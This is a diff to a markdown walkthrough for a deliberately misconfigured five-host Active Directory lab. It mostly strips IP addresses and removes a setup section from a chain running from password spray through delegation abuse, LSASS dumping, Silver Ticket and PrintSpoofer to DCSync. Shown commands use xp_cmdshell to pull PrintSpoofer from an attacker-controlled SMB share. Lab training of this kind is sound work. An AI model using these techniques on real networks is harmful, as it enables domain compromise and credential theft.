@@ -21,11 +21,11 @@ The full attack chain runs across five hosts: an IIS web frontend, a WinRM API b
 
 | Step | Source | Target | Technique | ATT&CK |
 |---|---|---|---|---|
-| 1 | Attacker (no creds) | DC02 (.10) | Password spray → svc_web credentials | T1110.003 |
+| 1 | Attacker (no creds) | DC02 | Password spray → svc_web credentials | T1110.003 |
 | 2 | svc_web (domain user) | SRV05-API | S4U2Self + S4U2Proxy delegation abuse → impersonate DA | T1550.003 / T1558 |
 | 3 | Local Admin hash (PTH) | SRV06-OPT | LSASS dump → extract svc_sql NT hash | T1003.001 |
 | 4 | svc_sql NT hash | SRV07-SQL | Silver Ticket → xp_cmdshell → PrintSpoofer → SYSTEM | T1558.002 / T1134 |
-| 5 | SRV07-SQL$ machine hash | DC02 (.10) | RBCD write → S4U → Domain Admin → DCSync | T1098 / T1003.006 |
+| 5 | SRV07-SQL$ machine hash | DC02 | RBCD write → S4U → Domain Admin → DCSync | T1098 / T1003.006 |
 
 ---
 
@@ -62,7 +62,7 @@ Three deliberate misconfigurations chain together to enable full compromise from
 
 ### 2.4 Boot Order
 
-Boot **DC02 (.10)** first and wait 90 seconds for AD DS and DNS to fully initialise. The DC runs a startup script (`DC-SelfUpdate.ps1`) that updates its own DNS A record to reflect the new QEMU-assigned IP. All four member servers can then boot in any order — each runs `Find-DC.ps1` at startup, which calculates the DC IP by substituting `.10` into its own subnet, sets DNS, and verifies LDAP connectivity before completing.
+Boot **DC02** first and wait 90 seconds for AD DS and DNS to fully initialise. The DC runs a startup script (`DC-SelfUpdate.ps1`) that updates its own DNS A record to reflect the new QEMU-assigned IP. All four member servers can then boot in any order — each runs `Find-DC.ps1` at startup, which calculates the DC IP by substituting `.10` into its own subnet, sets DNS, and verifies LDAP connectivity before completing.
 
 The lab is fully operational approximately 3–5 minutes after all five VMs are running.
 
@@ -82,37 +82,11 @@ Before running any attack step, execute the setup function from the attack scrip
 | kerbrute | Kerberos-based password spray (generates more realistic 4771 events) |
 | PrintSpoofer64.exe | SeImpersonatePrivilege escalation to SYSTEM on SRV07-SQL |
 
-### 3.2 Running Setup
-
-Make the attack script executable and launch it as root, then select option `[0]` from the interactive menu.
-
-```bash
-chmod +x attack_chain.sh
-sudo ./attack_chain.sh
-# From the menu, select [0] — Setup Environment
-```
-
-The setup function performs the following automatically:
-
-**Network discovery** — Scans the attacker's own `/24` subnet using nmap to locate all live lab hosts. It identifies each machine by reverse DNS PTR record, NetBIOS banner, or `nxc smb` hostname enumeration, then maps short names to FQDNs.
-
-**`/etc/resolv.conf` update** — Points the attacker's DNS resolver at DC02's IP so that all FQDN lookups resolve correctly through the domain's DNS server.
-
-**`/etc/hosts` population** — Writes all five FQDNs and their resolved IPs into `/etc/hosts` as a fallback for tools that do not honour `resolv.conf`.
-
-**`/etc/krb5.conf` configuration** — Writes the Kerberos realm configuration pointing at DC02 as the KDC and admin server. This is required for all Impacket tools that use `-k` (Kerberos authentication).
-
-**Clock synchronisation** — Queries DC02's SMB2 timestamp to synchronise the attacker clock. Kerberos authentication will fail with a clock skew greater than five minutes.
-
-**Tool verification** — Checks all required Impacket components, nxc, nmap, kerbrute, and PrintSpoofer64.exe are present and reports any missing before the chain begins.
-
-**State persistence** — All extracted credentials are written to `/opt/redteam/loot/.state` after each step. If a step is interrupted, re-running it reloads the last saved state. Use option `[S]` to view current state at any time.
-
 ---
 
 ## Step 1 — Reconnaissance + Password Spray
 
-**Target:** `DC02.cyberange.local (.10) via SRV04-WEB (.20)` &nbsp;|&nbsp; **MITRE:** T1110.003 — Password Spraying
+**Target:** `DC02.cyberange.local via SRV04-WEB` &nbsp;|&nbsp; **MITRE:** T1110.003 — Password Spraying
 
 ### What This Step Does
 
@@ -240,7 +214,7 @@ The `Constrained w/ Protocol Transition` entry confirms `TrustedToAuthForDelegat
 
 ## Step 2 — S4U2Self / S4U2Proxy Delegation Abuse
 
-**Target:** `SRV05-API.cyberange.local (.30)` &nbsp;|&nbsp; **MITRE:** T1550.003 — Pass the Ticket / T1558 — Steal or Forge Kerberos Tickets
+**Target:** `SRV05-API.cyberange.local` &nbsp;|&nbsp; **MITRE:** T1550.003 — Pass the Ticket / T1558 — Steal or Forge Kerberos Tickets
 
 ### What This Step Does
 
@@ -335,7 +309,7 @@ The recovered hash is the **local** Administrator account hash. It applies to SR
 
 ## Step 3 — Lateral Movement to SRV06-OPT + LSASS Dump
 
-**Target:** `SRV06-OPT.cyberange.local (.40)` &nbsp;|&nbsp; **MITRE:** T1003.001 — OS Credential Dumping: LSASS Memory
+**Target:** `SRV06-OPT.cyberange.local` &nbsp;|&nbsp; **MITRE:** T1003.001 — OS Credential Dumping: LSASS Memory
 
 ### What This Step Does
 
@@ -422,7 +396,7 @@ grep -oP 'S-1-5-21-[\d-]+' /opt/redteam/loot/secretsdump_srv06.txt | head -1
 
 ## Step 4 — Silver Ticket + MSSQL + PrintSpoofer Privilege Escalation
 
-**Target:** `SRV07-SQL.cyberange.local (.50)` &nbsp;|&nbsp; **MITRE:** T1558.002 — Silver Ticket / T1134 — Access Token Manipulation
+**Target:** `SRV07-SQL.cyberange.local` &nbsp;|&nbsp; **MITRE:** T1558.002 — Silver Ticket / T1134 — Access Token Manipulation
 
 ### What This Step Does
 
@@ -511,7 +485,7 @@ impacket-smbserver \
 
 # Inside the MSSQL session — map the attacker SMB share and copy PrintSpoofer
 EXEC xp_cmdshell 'net use \\<ATTACKER_IP>\share /user:att att';
-EXEC xp_cmdshell 'copy \\<ATTACKER_IP>\share\PrintSpoofer64.exe C:\Windows\Temp\PrintSpoofer64.exe /Y';
+EXEC xp_cmdshell 'powershell.exe -c "copy \\<ATTACKER_IP>\share\PrintSpoofer64.exe C:\Windows\Temp\PrintSpoofer64.exe /Y"';
 EXEC xp_cmdshell 'net use \\<ATTACKER_IP>\share /delete /y';
 
 # Verify the file is present on the target
@@ -579,7 +553,7 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:<LOCAL_ADMIN_HASH>
 
 ## Step 5 — RBCD Abuse → Domain Admin → DCSync
 
-**Target:** `DC02.cyberange.local (.10)` &nbsp;|&nbsp; **MITRE:** T1098 — Account Manipulation / T1003.006 — DCSync
+**Target:** `DC02.cyberange.local` &nbsp;|&nbsp; **MITRE:** T1098 — Account Manipulation / T1003.006 — DCSync
 
 ### What This Step Does
 
